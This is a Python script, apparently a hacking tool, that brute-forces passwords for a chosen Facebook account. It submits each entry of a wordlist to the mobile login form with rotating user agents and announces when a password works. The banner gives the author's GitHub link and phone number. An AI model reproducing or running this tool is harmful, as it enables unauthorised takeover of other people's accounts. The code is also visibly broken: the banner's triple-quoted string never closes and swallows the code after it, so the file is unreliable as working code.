# -*- coding: utf-8 -*-
import os
import sys
import time
import random

# Try to import mechanize
try:
    import mechanize
except ImportError:
    print("\n[!] 'mechanize' module not found!")
    print(" Install with: pip install mechanize")
    print(" For Termux: pkg install python && pip install mechanize\n")
    sys.exit(1)

# Input compatibility (Python 2 & 3)
try:
    input = raw_input  # Python 2
except NameError:
    pass  # Python 3


# Clear screen
def clear():
    os.system('clear' if 'linux' in sys.platform else 'cls')


clear()


# Loading animation
def loading():
    for i in range(101):
        sys.stdout.write(f'\r[{"█" * i}{" " * (100 - i)}] {i}%')
        sys.stdout.flush()
        time.sleep(0.01)
    clear()


# Banner
def banner():
    print('''
       ___   _     ______  ___   _   _ _____ 
      / _ \ | |    | ___ \/ _ \ | \ | |_   _|
     / /_\ \| |    | |_/ / /_\ \|  \| | | |  
     |  _  || |    | ___ \  _  || . ` | | |  
     | | | || |____| |_/ / | | || |\  |_| |_ 
     \_| |_/\_____/\____/\_| |_/\_| \_/\___/ 

                                      
           [-_-] HELLO IDIOT [-_-]
     ▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀
     █████████████████████████████████████████
       AUTHOR : Dhul-Qarnayn
       GITHUB : https://github.com/MMAB-313
    ███████████████████████████████████████████
     WHATSAPP : +8801844756619
    ███████████████████████████████████████████
        USAGE : Facebook Target Bruteforce
    time.sleep(1.5)


# Brute force function
def brute(password):
    global target
    try:
        br = mechanize.Browser()
        br.set_handle_robots(False)
        br.set_handle_redirect(True)
        br.set_handle_equiv(True)
        br.set_handle_referer(True)
        br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
        br.addheaders = [('User-agent', random.choice(user_agents))]
        
        # Facebook login URL (old, may not work)
        br.open('https://m.facebook.com/login.php')
        br.select_form(nr=0)
        br.form['email'] = target
        br.form['pass'] = password
        response = br.submit()
        
        # Check if login successful
        if "home.php" in response.geturl() or "findfriend" in response.geturl():
            print(f'\n\n\033[92m[+] PASSWORD FOUND ===> \033[96m{password}\033[0m')
            input('\n......PRESS ENTER TO EXIT.....')
            sys.exit(0)
        else:
            print(f'\r[+] Trying..... {password:<30}', end='', flush=True)
    except Exception as e:
        pass  # Silent fail


# Main function
def main():
    banner()
    loading()
    
    global target
    target = input('\n[?] Enter Target ID/Email : ').strip()
    if not target:
        print("[!] Target cannot be empty!")
        sys.exit(1)
    
    wordlist = input('TYPE password.txt : ').strip()
    if not os.path.exists(wordlist):
        print(f"[!] File '{wordlist}' not found!")
        input('......PRESS ENTER TO EXIT.....')
        sys.exit(1)
    
    try:
        with open(wordlist, 'r', encoding='utf-8') as f:
            passwords = [line.strip() for line in f if line.strip()]
    except Exception as e:
        print(f"[!] Error reading file: {e}")
        sys.exit(1)
    
    if not passwords:
        print("[!] Wordlist is empty!")
        sys.exit(1)
    
    print(f'\n[+] Account to crack : {target}')
    print(f'[+] WORDLIST COUNT : {len(passwords)}')
    print('[*] CRACKING IN PROGRESS, PLEASE WAIT .....\n')
    
    for pwd in passwords:
        time.sleep(0.3)
        brute(pwd)
    
    print('\n\n[-] SORRY, PASSWORD NOT FOUND')
    print(' MAKE A NEW password/Wordlist')
    input('\n......PRESS ENTER TO EXIT.....')


# User Agents
user_agents = [
    'Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0',
    'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Gecko/20080725 Firefox/3.0.1',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
]


# Run
if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        print('\n\n[!] Stopped by user.')
        sys.exit(0)
